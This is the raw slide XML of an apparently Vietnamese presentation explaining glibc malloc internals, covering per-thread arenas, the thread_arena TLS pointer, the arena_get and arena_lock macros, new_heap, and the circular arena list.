          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="3273552"/>
            <a:ext cx="4370832"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new_heap() CẤP GÌ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="3566160"/>
            <a:ext cx="4370832" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Một vùng mmap mới, căn HEAP_MAX_SIZE; malloc_state nằm ngay sau heap_info trong CHÍNH vùng đó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="4709160"/>
            <a:ext cx="4736592" cy="1508760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4848"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4873752"/>
            <a:ext cx="437083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HAI TÁC DỤNG PHỤ CUỐI HÀM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="5166360"/>
            <a:ext cx="4370832" cy="941832"/>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chemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>thread_arena (TLS, mục 2.4) được gán arena mới</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a-&gt;next = main_arena.next rồi main_arena.next = a: arena mới luôn chèn ngay sau main_arena</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Một thread chọn arena nào</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2.4 · arena.c:74, 113, 118</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6309360" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5943600" cy="2514600"/>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static __thread mstate thread_arena</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attribute_tls_model_ie;      /* arena.c:74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#define arena_get(ptr, size) do {        /* 113 */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  ptr = thread_arena;  /* dùng lại arena đã cache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arena_lock (ptr, size);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while (0)</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#define arena_lock(ptr, size) do {       /* 118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if (ptr)</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__libc_lock_lock (ptr-&gt;mutex);</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else</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    ptr = arena_get2 ((size), NULL);  /* chưa có -&gt; tìm/tạo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while (0)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4343400"/>
            <a:ext cx="6309360" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3902"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4507992"/>
            <a:ext cx="5943600"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thread_arena LÀ CON TRỎ TLS (__thread)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4800600"/>
            <a:ext cx="5943600" cy="1307592"/>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Mỗi thread giữ một bản riêng, không chia sẻ — khác hẳn malloc_state dùng chung trong một arena.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="1417320"/>
            <a:ext cx="4736592" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1581912"/>
            <a:ext cx="4370832"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LẦN malloc()/free() ĐẦU TIÊN CỦA THREAD</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1874520"/>
            <a:ext cx="4370832" cy="1719072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>thread_arena == NULL → rơi vào arena_get2: thử tái sử dụng arena rảnh trong free_list (reused_arena, arena.c:811), không có mới gọi _int_new_arena (2.3).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="3931920"/>
            <a:ext cx="4736592" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4096512"/>
            <a:ext cx="437083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SAU LẦN ĐẦU</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4389120"/>
            <a:ext cx="4370832" cy="1719072"/>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thread_arena đã có giá trị: mọi malloc()/free() kế tiếp của thread này vào thẳng arena đó, chỉ còn khoá mutex, không phải tìm/tạo lại.</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Hai thread, hai arena, một danh sách liên kết</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2.5 · 2.7 · arena.c:127, 129</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2581"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="5120640" cy="22860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THREAD 1 (MAIN) — chưa tranh chấp khoá</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1965960"/>
            <a:ext cx="4974336" cy="64008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thread_arena (TLS) = &amp;main_arena</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2606040"/>
            <a:ext cx="0" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2971800"/>
            <a:ext cx="4974336" cy="82296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brk-heap liền mạch · bit A = 0 trên mọi chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2581"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1581912"/>
            <a:ext cx="5120640" cy="22860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THREAD 2 — tranh chấp khoá → _int_new_arena()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483096" y="1965960"/>
            <a:ext cx="4974336" cy="64008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thread_arena (TLS) = &amp;Arena#2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8961120" y="2606040"/>
            <a:ext cx="0" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483096" y="2971800"/>
            <a:ext cx="4974336" cy="347472"/>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050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>heap_info · ar_ptr ↓  (arena.c:53, mmap mới)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483096" y="3364992"/>
            <a:ext cx="4974336" cy="429768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc_state ngay sau (h + 1) · bit A = 1 trên mọi chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="1252728"/>
            <a:ext cx="1371600" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>main_arena.next →</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5998464" y="1399032"/>
            <a:ext cx="192024" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4434840"/>
            <a:ext cx="5522976" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="459943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DANH SÁCH LIÊN KẾT ARENA (VÒNG TRÒN)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4892040"/>
            <a:ext cx="5157216" cy="121615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main_arena.next → Arena#2 → main_arena: đơn, vòng tròn qua trường next (mũi tên phía trên là chiều main_arena.next). Arena mới luôn chèn ngay sau main_arena.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4434840"/>
            <a:ext cx="5522976" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="459943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heap_for_ptr / arena_for_chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4892040"/>
            <a:ext cx="5157216" cy="1216152"/>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accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>heap_for_ptr(p) = p &amp; ~(HEAP_MAX_SIZE-1)</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> → heap_info</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bit A = 0 → trả thẳng &amp;main_arena, không cần tính gì</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Ranh giới: OS cấp vùng, glibc chia nhỏ thành chunk</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KHÁI NIỆM · MỤC 3 · TRƯỚC KHI VÀO CHI TIẾT CHUNK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="3749040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1951"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="158191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MỤC 2 · OS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="5157216" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cấp vùng địa chỉ ảo thô</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2423160"/>
            <a:ext cx="5157216" cy="2633472"/>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accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>brk()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> mở rộng heap liền mạch, hoặc </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
